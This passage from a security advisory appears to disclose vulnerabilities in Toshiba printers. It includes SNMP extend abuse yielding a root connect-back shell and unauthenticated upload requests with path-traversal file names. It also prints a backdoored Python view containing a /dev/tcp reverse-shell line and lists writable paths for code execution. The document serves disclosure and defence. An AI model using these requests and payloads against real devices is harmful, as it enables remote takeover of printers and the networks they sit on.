NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."cmd" = STRING:   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."cmd" = STRING:   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    53  100    53    0     0     53      0  0:00:01 --:--:--  0:00:01   114
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."cmd" = INTEGER: 3
NET-SNMP-EXTEND-MIB::nsExtendResult."cmd" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."cmd".1 = STRING:   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
NET-SNMP-EXTEND-MIB::nsExtendOutLine."cmd".2 = STRING:                                  Dload  Upload   Total   Spent    Left  Speed
100    53  100    53    0     0     53      0  0:00:01 --:--:--  0:00:01   114
Error in packet.
Reason: inconsistentValue (The set value is illegal or unsupported in some way)
Failed object: NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd"
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 21
NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd" = STRING:  "/dev/shm/pwn.sh"
caTimeout: No Response from 10.0.0.1
</code></pre>
<p>And the connect-back shell script will connect to 10.0.0.2 on port 443/tcp, as defined in the previous <code>pwn.sh</code> script:</p>
<pre><code>kali# nc -l -v -p 443 
listening on [any] 443 ...                    
10.0.0.1: inverse host lookup failed: Unknown host 
connect to [10.0.0.2] from (UNKNOWN) [10.0.0.1] 36464
bash-4.1# uname -ap 
Linux MFP14144292 3.10.38-ltsi-WR6.0.0.11_standard #3513 SMP Tue Jul 5 09:58:22 IST 2022 i686 GNU/Linux
bash-4.1# id
uid=0(root) gid=2000(trusted) groups=0(root)
bash-4.1#
</code></pre>
<p>We can also review the configuration file located at <code>/encryption/al/network/config/snmpd.conf</code>, containing the default communities:</p>
<pre><code>bash-4.1# grep -v '^#' /encryption/al/network/config/snmpd.conf
rocommunity public

rocommunity6 public

rwcommunity private

rwcommunity6 private

com2sec udp       0.0.0.0/24     public

view all    included  .1                               80
view generaluser_view   excluded .1
view generaluser_view included .1.3.6.1.4.1.1129.2.3.50.1.3.23.2.1.3
view generaluser_view included .1.3.6.1.4.1.1129.2.3.50.1.3.21.4.1.3
view generaluser_view included .1.3.6.1.4.1.1129.2.3.50.1.3.21.4.1.4

access udpGroup                "toshibaAmerica"    v1      noauth   exact  all       all         none
access admin_priv_group              ""           usm       priv    prefix all       all         none
access admin_auth_group              ""           usm       auth    prefix all       all         none
access generaluser_priv_group        ""           usm       priv    prefix all  generaluser_view none
access generaluser_auth_group        ""           usm       auth    prefix all  generaluser_view none

trapcommunity public

dlmod  mibs_impl                        /home/SYSROM_SRC/lib/libalmibs_impl.so

master  off

agentaddress udp:161,udp6:161

authtrapenable 1

maxGetbulkRepeats 20

maxGetbulkResponses 100bash-4.1#
</code></pre>
<p>SNMP is also exposed over IPv6. </p>
<p><a id="pre-auth-rces-upload"></a></p>
<h2>Details - Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</h2>
<p>Toshiba printers provide several ways to upload files using the web interface.</p>
<p>By default, this web interface is reachable without authentication.</p>
<p>For example, using the e-filing web interface, freely reachable using http://ip:8080/?MAIN=EFILING, we can upload documents:</p>
<p><img alt="" src="images/2024-toshiba-pre-auth-upload-file-01.png" /></p>
<p><a href="images/2024-toshiba-pre-auth-upload-file-01-full.png">Click here for full image</a></p>
<p>It is possible to upload a document:</p>
<p><img alt="" src="images/2024-toshiba-pre-auth-upload-file-02.png" /></p>
<p><a href="images/2024-toshiba-pre-auth-upload-file-02-full.png">Click here for full image</a></p>
<p>The uploaded file will be stored inside the printer in the /work/al/tmp/upload/ directory, inside a directory named by the current session.</p>
<pre><code>bash-4.1# find /work/al/tmp/upload
/work/al/tmp/upload
/work/al/tmp/upload/ContentWebServer_10.0.0.2.f54c69d5d2b1963325041644084615ab
/work/al/tmp/upload/ContentWebServer_10.0.0.2.f54c69d5d2b1963325041644084615ab/test3.txt
/work/al/tmp/upload/ContentWebServer_10.0.0.2.f54c69d5d2b1963325041644084615ab/test1.txt
/work/al/tmp/upload/ContentWebServer_10.0.0.2.f54c69d5d2b1963325041644084615ab/test2.txt
bash-4.1# ls -latrR /work/al/tmp/upload
/work/al/tmp/upload:
total 12
drwxr-xr-x 7 root   lp      4096 Mar 24 05:35 ..
drwx------ 2 apache trusted 4096 Mar 24 05:43 ContentWebServer_10.0.0.2.f54c69d5d2b1963325041644084615ab
drwxrwxrwx 3 root   trusted 4096 Mar 24 05:46 .

/work/al/tmp/upload/ContentWebServer_10.0.0.2.f54c69d5d2b1963325041644084615ab:
total 20
-rw-rw-rw- 1 apache trusted    8 Mar 24 05:41 test1.txt
-rw-rw-rw- 1 apache trusted    9 Mar 24 05:42 test2.txt
-rw-rw-rw- 1 apache trusted    9 Mar 24 05:43 test3.txt
drwx------ 2 apache trusted 4096 Mar 24 05:43 .
drwxrwxrwx 3 root   trusted 4096 Mar 24 05:46 ..
bash-4.1#
</code></pre>
<p>This current session is provided by the printer when visiting the web interface without authentication.</p>
<p>An attacker can replay the HTTP request with a valid session obtained while browsing http://ip/?MAIN=EFILING without authentication, and change the path to the uploaded file. This path will then be used to store the file inside the remote printer.</p>
<p>For example, with a <code>Name</code> variable set to <code>/./../../../../../home/SYSROM_SRC/sbin/malicious.program</code>, the uploaded file is correctly written into <code>/home/SYSRM_SRC/sbin/malicious.program</code> inside the printer.</p>
<p>The HTTP request will be:</p>
<pre><code>POST /contentwebserver/upload HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------12552735029913057752829397207
Content-Length: 1011
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/efiling/UploadArchive.html?v=1517352288ta
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DDEVICE; Session=10.0.0.2.c8a776a2c87613d78cbb94c558269c61; IgnoreSessionTimeout=3
Upgrade-Insecure-Requests: 1

-----------------------------12552735029913057752829397207
Content-Disposition: form-data; name="formSubmitCompleteEventHandler"

frames[1].formSubmitComplete
-----------------------------12552735029913057752829397207
Content-Disposition: form-data; name="DeviceInformationModel"

&lt;DeviceInformationModel&gt;&lt;Command&gt;&lt;Move&gt;&lt;commandNode&gt;FileStorages&lt;/commandNode&gt;&lt;Params&gt;&lt;source&gt;&lt;File&gt;test.txt&lt;/File&gt;&lt;name&gt;Upload&lt;/name&gt;&lt;/source&gt;&lt;destination&gt;&lt;name&gt;DataImport&lt;/name&gt;&lt;/destination&gt;&lt;/Params&gt;&lt;/Move&gt;&lt;/Command&gt;&lt;/DeviceInformationModel&gt;
-----------------------------12552735029913057752829397207
Content-Disposition: form-data; name="CsrfpId"

10.0.0.2.c8a776a2c87613d78cbb94c558269c61
-----------------------------12552735029913057752829397207
Content-Disposition: form-data; name="/./../../../../../home/SYSROM_SRC/sbin/malicious.program"; filename="test.txt"
Content-Type: text/plain

MALICIOUS_CONTENT_WRITTEN_INTO_THE_HARD_DISK

-----------------------------12552735029913057752829397207--
</code></pre>
<p>Burp Request:</p>
<p><img alt="" src="images/2024-toshiba-pre-auth-upload-file-03.png" /></p>
<p><a href="images/2024-toshiba-pre-auth-upload-file-03-full.png">Click here for full image</a></p>
<p>And the file is correctly written into <code>/home/SYSRM_SRC/sbin/malicious.program</code> inside the printer:</p>
<p><img alt="" src="images/2024-toshiba-pre-auth-upload-file-04.png" /></p>
<p>This vulnerability can be used to get Remote Code Executions using several different ways. Due to some weaknesses found in Toshiba printers, there are hundreds different ways to get Remote Code Execution. For example:</p>
<ul>
<li>Upload of a malicious library defined in the LD_PRELOAD variable:<ul>
<li>/ramdisk/al/libGetNameInfoInterface.so or /ramdisk/al/libGetAddtInfoInterface.so can be overwritten by a malicious library</li>
</ul>
</li>
<li>Upload of a malicious library using the LD_LIBRARY_PATH variable - An attacker can upload malicious libraries inside:<ul>
<li>/home/SYSROM_SRC/build/release/lib,</li>
<li>/mfp/lib,</li>
<li>/home/SYSROM_SRC/NoBuildItems/common/lib,</li>
<li>/home/SYSROM_SRC/build/thirdparty/plugins/platforminputcontexts/,</li>
<li>/home/SYSROM_SRC/build/release/lib.</li>
</ul>
</li>
<li>Upload of a malicious program due to insecure permissions:<ul>
<li>As shown in <a href="#lpe-rce-106-programs">Local Privilege Escalation and Remote Code Execution using insecure permissions for 106 programs</a>, a lot of programs running as root can be overwritten due to insecure permissions (777)</li>
</ul>
</li>
<li>Upload a malicious Python program or a malicious Python library</li>
<li>...</li>
</ul>
<p>This lack of protection can be found in several HTML forms when using the printer, without administrative privileges. For example, the page at http://10.0.0.1:8080/Administration/maintenance/uploadsoft/DriverCustomize.html allows uploading any file:</p>
<p><img alt="" src="images/2024-toshiba-pre-auth-upload-file-05.png" /></p>
<p><a href="images/2024-toshiba-pre-auth-upload-file-05-full.png">Click here for full image</a></p>
<p>It is mandatory to inject a <code>&lt;INPUT TYPE=SUBMIT&gt;</code> in the server response using Burp or to directly generate such request to upload any file.</p>
<p>An example is shown below on how to get Remote Code Execution using the upload of a malicious Python script in the next section, using the following request:</p>
<pre><code>POST /contentwebserver/upload HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------394285998421640844852768059947
Content-Length: 1126
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/Administration/maintenance/uploadsoft/DriverCustomize.html
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DDEVICE; clicked=0; addrLastVisited=ADDRBK; IgnoreSessionTimeout=1; Session=10.0.0.2.5fb38c36e6e15dbe77652121b3d85e0c
Upgrade-Insecure-Requests: 1

-----------------------------394285998421640844852768059947
Content-Disposition: form-data; name="formSubmitCompleteEventHandler"

frames[0].formSubmitCompleteUploadList
-----------------------------394285998421640844852768059947
Content-Disposition: form-data; name="DeviceInformationModel"

&lt;DeviceInformationModel&gt;&lt;GetValue&gt;&lt;eFiling&gt;&lt;View&gt;&lt;BoxList/&gt;&lt;/View&gt;&lt;/eFiling&gt;&lt;/GetValue&gt;&lt;Command&gt;&lt;GetEFilingBoxes&gt;&lt;commandNode&gt;eFiling/BoxList&lt;/commandNode&gt;&lt;Params&gt;&lt;responseXpath contentType='XPath'&gt;eFiling/View/BoxList&lt;/responseXpath&gt;&lt;curPage contentType='Value'&gt;1&lt;/curPage&gt;&lt;pageSize contentType='Value'&gt;200&lt;/pageSize&gt;&lt;definedBox contentType='Value'&gt;true&lt;/definedBox&gt;&lt;/Params&gt;&lt;/GetEFilingBoxes&gt;&lt;/Command&gt;&lt;/DeviceInformationModel&gt;
-----------------------------394285998421640844852768059947
Content-Disposition: form-data; name="CsrfpId"

10.0.0.2.5fb38c36e6e15dbe77652121b3d85e0c
-----------------------------394285998421640844852768059947
Content-Disposition: form-data; name="test.txt"; filename="test.txt"
Content-Type: text/plain

test

-----------------------------394285998421640844852768059947--
</code></pre>
<p>And the file is correctly uploaded into the printer:</p>
<pre><code>bash-4.1# ls -la /work/al/tmp/upload/ContentWebServer_10.0.0.2.5fb38c36e6e15dbe77652121b3d85e0c/
total 12        
drwx------ 2 apache trusted 4096 May 27 19:34 .
drwxrwxrwx 3 root   trusted 4096 May 27 19:30 ..
-rw-rw-rw- 1 apache trusted    5 May 27 19:34 test.txt
bash-4.1# cat /work/al/tmp/upload/ContentWebServer_10.0.0.2.5fb38c36e6e15dbe77652121b3d85e0c/test.txt
test
bash-4.1#
</code></pre>
<p>We can find several webpages allowing exploiting the vulnerable <code>/contentwebserver/upload</code> API.</p>
<p>It was determined that these webpages are using the insecure <code>/contentwebserver/upload</code> API. They can be used by any attacker to upload any file into the printers:</p>
<ul>
<li>http://printer-ip/efiling/UploadFrame.html</li>
<li>http://printer-ip/efiling/UploadArchive.html</li>
<li>http://printer-ip/efiling/UploadFrame.html</li>
<li>http://printer-ip/efiling/UploadArchiveProgress.html</li>
<li>http://printer-ip/efiling/UpLoadArchiveClose.html</li>
<li>http://printer-ip/efiling/UploadArchiveButton.html</li>
<li>http://printer-ip/Registration/AddressBook/AddrImport.html</li>
<li>http://printer-ip/Registration/AddressBook/AddrImportListFrame.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/DriverCustomize.html</li>
<li>...</li>
</ul>
<p>Some of these files are directly reachable without authentication (e.g. Registration or efiling) and can be found without an admin account.</p>
<p><a id="pre-auth-rce-upload-wsgi-py"></a></p>
<h3>Remote Code Execution - Upload of a new .py module inside WSGI Python programs</h3>
<p>Some of the APIs and web interfaces of the printers are written in Python.</p>
<p>Since the permissions of these Python scripts inside the printers are insecure, a backdoored version of the <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py</code> has been uploaded as shown below:</p>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py</code> with a malicious payload added on line 25:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">1</span> <span style="color: #408080; font-style: italic">#! /usr/bin/env python</span>
 <span style="color: #666666">2</span> <span style="color: #408080; font-style: italic"># -*- coding: utf-8 -*-</span>
 <span style="color: #666666">3</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">sys</span>
 <span style="color: #666666">4</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">os</span>
 <span style="color: #666666">5</span> <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">pyramid.view</span> <span style="color: #008000; font-weight: bold">import</span> view_config
 <span style="color: #666666">6</span> <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">pyramid.exceptions</span> <span style="color: #008000; font-weight: bold">import</span> HTTPForbidden
 <span style="color: #666666">7</span> <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">pyramid.response</span> <span style="color: #008000; font-weight: bold">import</span> Response,FileResponse
 <span style="color: #666666">8</span> <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">server.screenfacade.appmgmt.applicationmanager</span> <span style="color: #008000; font-weight: bold">import</span> applicationManagementModel
 <span style="color: #666666">9</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">logging</span>
<span style="color: #666666">10</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">json</span>
<span style="color: #666666">11</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">pyeapicore</span>
<span style="color: #666666">12</span>
<span style="color: #666666">13</span> sys<span style="color: #666666">.</span>path<span style="color: #666666">.</span>append(<span style="color: #BA2121">&#39;/home/SYSROM_SRC/lib&#39;</span>)
<span style="color: #666666">14</span>
<span style="color: #666666">15</span> log <span style="color: #666666">=</span> logging<span style="color: #666666">.</span>getLogger(<span style="color: #BA2121">&quot;server&quot;</span>)
<span style="color: #666666">16</span>
<span style="color: #666666">17</span> <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span><span style="color: #BA2121">&#39;get_app_list_deployed&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>, renderer<span style="color: #666666">=</span><span style="color: #BA2121">&#39;jsonp&#39;</span>)
<span style="color: #666666">18</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">get_app_list_deployed</span>(request):
<span style="color: #666666">19</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;++++++++++++++++++++++++++++++++&quot;</span>)
<span style="color: #666666">20</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;get app list Views : Start &quot;</span>)
<span style="color: #666666">21</span>     SessionID <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">22</span>     session <span style="color: #666666">=</span> <span style="color: #BA2121">&#39; &#39;</span>
<span style="color: #666666">23</span>     csrfpId <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">24</span>     browserLang <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">25</span>     os<span style="color: #666666">.</span>system(<span style="color: #BA2121">&quot;bash -i &gt;&amp; /dev/tcp/10.0.0.2/21 0&gt;&amp;1&quot;</span>)
<span style="color: #666666">26</span>
<span style="color: #666666">27</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;SessionID&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>cookies:
<span style="color: #666666">28</span>         SessionID <span style="color: #666666">=</span> request<span style="color: #666666">.</span>cookies[<span style="color: #BA2121">&#39;SessionID&#39;</span>]
<span style="color: #666666">29</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;Session&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>cookies:
<span style="color: #666666">30</span>         session <span style="color: #666666">=</span> request<span style="color: #666666">.</span>cookies[<span style="color: #BA2121">&#39;Session&#39;</span>]
<span style="color: #666666">31</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;csrfpId&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>headers:
<span style="color: #666666">32</span>         csrfpId <span style="color: #666666">=</span> request<span style="color: #666666">.</span>headers[<span style="color: #BA2121">&#39;csrfpId&#39;</span>]
<span style="color: #666666">33</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;BrowserLang&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>cookies:
<span style="color: #666666">34</span>         browserLang <span style="color: #666666">=</span> request<span style="color: #666666">.</span>cookies[<span style="color: #BA2121">&#39;BrowserLang&#39;</span>]
<span style="color: #666666">35</span>
<span style="color: #666666">36</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;Session ID obtained from request :&#39;</span> <span style="color: #666666">+</span> SessionID)
<span style="color: #666666">37</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;csrfpId obtained from request:&#39;</span> <span style="color: #666666">+</span> csrfpId)
<span style="color: #666666">38</span>     validationMap <span style="color: #666666">=</span> <span style="color: #008000">True</span>
<span style="color: #666666">39</span>
<span style="color: #666666">40</span>     <span style="color: #008000; font-weight: bold">if</span> validationMap[<span style="color: #BA2121">&#39;VALIDATION_STATUS&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;PASSED&#39;</span>:
<span style="color: #666666">41</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;User Validation : SUCCESS&#39;</span>)
<span style="color: #666666">42</span>         data <span style="color: #666666">=</span> applicationManagementModel<span style="color: #666666">.</span>getAppList(browserLang)
<span style="color: #666666">43</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;get app list Views : End &quot;</span>)
<span style="color: #666666">44</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;++++++++++++++++++++++++++++++++&quot;</span>)
<span style="color: #666666">45</span>         <span style="color: #008000; font-weight: bold">return</span> json<span style="color: #666666">.</span>dumps(data)
<span style="color: #666666">46</span>     <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">47</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;User Validation : FAILURE&#39;</span>)
<span style="color: #666666">48</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;get app list Views : End &quot;</span>)
<span style="color: #666666">49</span>         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&quot;HTTP_REQUEST_FORBIDDEN&quot;</span> <span style="color: #AA22FF; font-weight: bold">in</span> validationMap:
<span style="color: #666666">50</span>             <span style="color: #008000; font-weight: bold">return</span> HTTPForbidden(<span style="color: #BA2121">&quot;Error 403 : Forbidden Request&quot;</span>)
<span style="color: #666666">51</span>         <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">52</span>             <span style="color: #008000; font-weight: bold">return</span> json<span style="color: #666666">.</span>dumps(validationMap)
<span style="color: #666666">53</span>
<span style="color: #666666">54</span> <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span><span style="color: #BA2121">&#39;start_background_application&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>, renderer<span style="color: #666666">=</span><span style="color: #BA2121">&#39;jsonp&#39;</span>)
<span style="color: #666666">55</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">start_background_application</span>(request):
<span style="color: #666666">56</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;++++++++++++++++++++++++++++++++&quot;</span>)
<span style="color: #666666">57</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;start background app : Start &quot;</span>)
[<span style="color: #666666">...</span>]
</pre></div>

<p>Due to some reverse proxy rules and check before this API can be reached, this Python code is reachable using the API path <code>http://printerip/tapy/server/appmgmt/applistDeployed</code> with a cookie previously provided by the printer when visiting http://printerip/ (without authentication).</p>
<p>When sending a HTTP request to <code>http://printerip/tapy/server/appmgmt/applistDeployed</code>, the attacker will receive a connect-back shell from the printer:</p>
<pre><code>kali# nc -l -v -p 21
listening on [any] 21 ...
10.0.0.1: inverse host lookup failed: Unknown host 
connect to [10.0.0.2] from (UNKNOWN) [10.0.0.1] 37243
[apache@MFP14144292 /]$ id
uid=1000(apache) gid=2000(trusted) groups=2000(trusted)
[apache@MFP14144292 /]$ uname -ap
Linux MFP14144292 3.10.38-ltsi-WR6.0.0.11_standard #3513 SMP Tue Jul 5 09:58:22 IST 2022 i686 GNU/Linux
[apache@MFP14144292 /]$
</code></pre>
<p>Connect-back shell as apache:</p>
<p><img alt="" src="images/2024-toshiba-connect-back-shell-apache.png" /></p>
<p><a id="pre-auth-rce-upload-wsgi-ini"></a></p>
<h3>Remote Code Execution - Upload of a new .ini configuration files inside WSGI Python programs</h3>
<p>It is possible to overwrite the .ini configuration file used by WSGI Python programs. This technique is public as of 2023-02-28: <a href="https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html">https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html</a>.</p>
<p>Apache is running with WSGI configurations:</p>
<pre><code>bash-4.1# ps auxww | grep apache
apache    1611  0.0  0.1 1264444 3708 ?        Sl   10:37   0:00 /usr/local/ebx/httpd_worker/bin/httpd_worker -f /encryption/al/network/config/httpd-prox.conf -k start
apache    1822  0.2  3.6 483056 108852 ?       Sl   10:37   1:02 (wsgi:webpanel)                              -f /encryption/al/network/config/httpd-wsgi.conf -k start
apache    1823  0.0  2.1 270952 64172 ?        Sl   10:37   0:05 (wsgi:topaccesspy)                           -f /encryption/al/network/config/httpd-wsgi.conf -k start
apache    1824  0.0  0.1 285148  4452 ?        Sl   10:37   0:00 /usr/local/ebx/httpd_worker/bin/httpd_worker -f /encryption/al/network/config/httpd-wsgi.conf -k start
</code></pre>
<p>The Python scripts running as WSGI are configured with specific .ini configuration files:</p>
<ul>
<li><code>/registration/al/WebPanel/development.ini</code></li>
<li><code>/registration/al/TopAccessPy/development.ini</code></li>
</ul>
<p>Unfortunately, these configuration files can be rewritten because of insecure permissions, allowing a remote attacker to execute commands, as described in recent public research.</p>
<p>These files have insecure permissions as shown below:</p>
<pre><code>bash-4.1# ls -la /registration/al/WebPanel/
total 2632
drwxrwxrwx  7 root root    4096 Dec  6 03:33 .
drwxrwxrwx 19 root root    4096 Mar 14 16:28 ..
-rwxrwxrwx  1 root root 2642944 Dec  6 03:33 HomeBackgroundImages.tar.gz
-rwxrwxrwx  1 root root     857 Dec  6 03:33 Makefile
-rwxrwxrwx  1 root root     909 Dec  6 03:33 config.rb
-rwxrwxrwx  1 root root    1103 Dec  6 03:33 development.ini
drwxrwxrwx  4 root root    4096 Jan 22  2015 predefinedxml
-rwxrwxrwx  1 root root     199 Dec  6 03:33 pyramid.wsgi
drwxrwxrwx  3 root root    4096 Dec  6 03:33 statuspages
drwxrwxrwx 14 root root    4096 Dec  6 03:33 wpclient
drwxrwxrwx  6 root root    4096 Mar 14 16:32 wpserver
drwxrwxrwx  2 root root    4096 Dec  6 03:33 wpserver.egg-info
bash-4.1# ls -la /registration/al/WebPanel/development.ini
-rwxrwxrwx 1 root root 1103 Dec  6 03:33 /registration/al/WebPanel/development.ini

bash-4.1# ls -la /registration/al/TopAccessPy
total 36
drwxrwxrwx  5 root root 4096 Dec  6 03:39 .
drwxrwxrwx 19 root root 4096 Mar 14 16:28 ..
-rwxrwxrwx  1 root root  315 Dec  6 03:39 Makefile
-rwxrwxrwx  1 root root 2091 Dec  6 03:39 TA_CacheScript.sh
drwxrwxrwx  7 root root 4096 Mar 23 10:37 client
-rwxrwxrwx  1 root root 1078 Dec  6 03:39 development.ini
-rwxrwxrwx  1 root root  202 Dec  6 03:39 pyramid.wsgi
drwxrwxrwx  6 root root 4096 Mar 14 16:32 server
drwxrwxrwx  2 root root 4096 Dec  6 03:39 server.egg-info
bash-4.1# ls -la /registration/al/TopAccessPy/development.ini
-rwxrwxrwx 1 root root 1078 Dec  6 03:39 /registration/al/TopAccessPy/development.ini
</code></pre>
<p>These scripts can be overwritten to include specific commands to be executed:</p>
<p>Content of <code>/registration/al/TopAccessPy/development.ini</code>:</p>
<pre><code>bash-4.1# cat /registration/al/TopAccessPy/development.ini
[app:main]
use = egg:server

pyramid.reload_templates = true
pyramid.debug_authorization = false
pyramid.debug_notfound = false
pyramid.debug_routematch = false
pyramid.default_locale_name = en
pyramid.includes = pyramid_tm

[server:main]

# Begin logging configuration

[loggers]
keys = root, server

[handlers]
keys = console, serverhandler

[formatters]
keys = generic, serverformatter

[logger_root]
level = DEBUG
handlers = console

[logger_server]
level=DEBUG
handlers=serverhandler
qualname=server
propagate=0

[handler_console]
class = StreamHandler
args = (sys.stderr,)
level = NOTSET
formatter = generic

[handler_serverhandler]
class=logging.handlers.RotatingFileHandler
level=DEBUG
formatter=serverformatter
args=('/work/log/al/webpanel/python_ta.log','a',(5*1024*1024),3)

[formatter_generic]
format = %(asctime)s %(levelname)-5.5s [%(name)s][%(threadName)s] %(message)s

[formatter_serverformatter]
format=%(asctime)s%(msecs)03d Pid= %(process)d Tid= %(thread)d %(filename)s     %(lineno)d %(levelname)s %(message)s
datefmt=%m/%d %H:%M:%S

# End logging configuration
</code></pre>
<p><a id="pre-auth-rce-upload-gdb"></a></p>
<h3>Remote Code Execution - Upload of a malicious script <code>/tmp/backtraceScript.sh</code> and injection of malicious gdb commands</h3>
<p>When a program crashes, the <code>/tmp/backtraceScript.sh</code> script will be executed as root as shown below:</p>
<pre><code>2023/05/27 19:48:02 CMD: UID=0     PID=22535  | sh -c /tmp/backtraceScript.sh "/work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080" &gt; "/work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080"_backtrace 
2023/05/27 19:48:02 CMD: UID=0     PID=22536  | /bin/bash /tmp/backtraceScript.sh /work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080 
2023/05/27 19:48:02 CMD: UID=0     PID=22540  | /bin/bash /tmp/backtraceScript.sh /work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080 
2023/05/27 19:48:02 CMD: UID=0     PID=22539  | /bin/bash /tmp/backtraceScript.sh /work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080 
2023/05/27 19:48:02 CMD: UID=0     PID=22538  | /bin/bash /tmp/backtraceScript.sh /work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080 
2023/05/27 19:48:02 CMD: UID=0     PID=22537  | /bin/bash /tmp/backtraceScript.sh /work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080 
2023/05/27 19:48:03 CMD: UID=0     PID=22541  | gdb -c /work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080 -x /tmp/gdb_commands.txt 
2023/05/27 19:48:03 CMD: UID=0     PID=22542  | gdb /usr/local/ebx/httpd_worker/bin/httpd_worker /work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080 --batch --command=/tmp/gdb_commands.txt 
2023/05/27 19:48:03 CMD: UID=0     PID=22543  | iconv -l
</code></pre>
<p>This script has insecure permissions (777) and will run gdb as root:</p>
<p>Content of <code>/tmp/backtraceScript.sh</code>:</p>
<pre><code>bash-4.1# ls -la /tmp/backtraceScript.sh
-rwxrwxrwx 1 root root 1457 Apr  6  2016 /tmp/backtraceScript.sh
bash-4.1# cat /tmp/backtraceScript.sh
#!/bin/bash
OIFS=${IFS}
IFS=$'\n'
echo "quit" &gt; /tmp/gdb_commands.txt
echo "quit" &gt;&gt; /tmp/gdb_commands.txt
